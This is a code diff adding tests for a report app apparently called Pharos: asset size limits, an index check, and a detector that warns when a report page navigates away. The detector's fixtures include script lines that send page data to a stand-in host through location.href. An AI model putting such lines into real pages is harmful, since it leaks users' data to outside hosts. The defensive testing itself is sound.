@@ -8,6 +8,7 @@ import {
   ReportAssets,
   blockedExternals,
   decodeBase64,
+  navigationWarnings,
   referencedPaths,
   scheduleAssetPurge,
 } from './report.js';
@@ -417,6 +418,40 @@ describe('report assets (R13)', () => {
   });
 });
 
+describe('all report assets together are bounded (R13.6)', () => {
+  it("counts every page's files, deleted pages' kept files too, and says so plainly", () => {
+    const { store, make } = setup();
+    const a = make().view.id;
+    const b = make().view.id;
+    const limits = { ...REPORT_LIMITS, totalAssetBytes: 10 };
+    const assets = new ReportAssets(store, limits);
+    assets.put(agent, a, 'a.png', png(4));
+    assets.put(agent, b, 'b.png', png(4));
+    // Replacing a file counts its new size, not both.
+    assets.put(agent, a, 'a.png', png(6));
+    expect(() => assets.put(agent, b, 'c.png', png(1))).toThrow(
+      /Report pages' files would come to .* in all; Pharos keeps at most .* deleted in the last 30 days/,
+    );
+    // A deleted page's files are kept (for undo) and still count.
+    store.apply(me, {
+      message: 'Delete a page',
+      operations: [{ op: 'delete', type: 'view', id: a }],
+    });
+    expect(() => assets.put(agent, b, 'c.png', png(1))).toThrow(/in all/);
+    expect(new ReportAssets(store).list(b)).toHaveLength(1);
+  });
+
+  it('answers the size checks from an index, never reading the files', () => {
+    const { store } = setup();
+    const plan = store.database
+      .prepare(
+        'EXPLAIN QUERY PLAN SELECT COALESCE(SUM(size), 0) AS stored FROM report_assets WHERE NOT (view_id = ? AND path = ?)',
+      )
+      .all('v', 'p') as { detail: string }[];
+    expect(plan.map((r) => r.detail).join(' ')).toMatch(/COVERING INDEX report_assets_sizes/);
+  });
+});
+
 describe('page checks (view_preview, R13)', () => {
   it('finds relative references and blocked hosts', () => {
     const html = `<img src="img/a.png"><img src='b.jpg?x=1#y'><a href="#top">t</a>
@@ -516,6 +551,47 @@ describe('page checks (view_preview, R13)', () => {
     );
     expect(draft.warnings.join('\n')).toMatch(/No dark colours/);
     expect(draft.warnings.join('\n')).toMatch(/No summary/);
+  });
+});
+
+describe('pages that try to leave their frame (view_preview, R13.6)', () => {
+  it('warns on scripts that set location, call window.open, and on a meta refresh', () => {
+    const cases: [string, RegExp | null][] = [
+      ['<script>location.href = "https://x.example/?d=" + rows</script>', /sets location/],
+      ["<script>window.location = 'https://x.example'</script>", /sets location/],
+      ['<script>location="https://x.example"</script>', /sets location/],
+      ['<script>top.location.href="https://x.example"</script>', /sets location/],
+      ['<script>location.assign(u)</script>', /sets location/],
+      ['<script>document.location.replace(u)</script>', /sets location/],
+      ['<button onclick="location.href=\'https://x.example\'">go</button>', /sets location/],
+      ['<script>window.open("https://x.example")</script>', /window\.open/],
+      [
+        '<meta http-equiv="Refresh" content="0;url=https://x.example">',
+        /meta http-equiv="refresh"/,
+      ],
+      // Reading or comparing location is fine, and so is prose about it.
+      ['<script>if (location.href == x) show(location.hash)</script>', null],
+      ['<p>Set location.href = "x" to move; call window.open(url)</p>', null],
+      ['<a href="https://x.example">a plain link</a>', null],
+    ];
+    for (const [html, expected] of cases) {
+      const warnings = navigationWarnings(html);
+      if (expected) expect(warnings.join('\n'), html).toMatch(expected);
+      else expect(warnings, html).toEqual([]);
+    }
+  });
+
+  it('view_preview shows them, pointing to plain links and pharos.openLink', () => {
+    const { store, projectId } = setup();
+    const preview = previewAny(store, {
+      projectId,
+      page: {
+        html: '<script>pharos.data("x").then(r => { location.href = "https://x.example/?d=" + r })</script>',
+      },
+    });
+    const text = preview.warnings.join('\n');
+    expect(text).toMatch(/sets location/);
+    expect(text).toContain('pharos.openLink(url)');
   });
 });
 
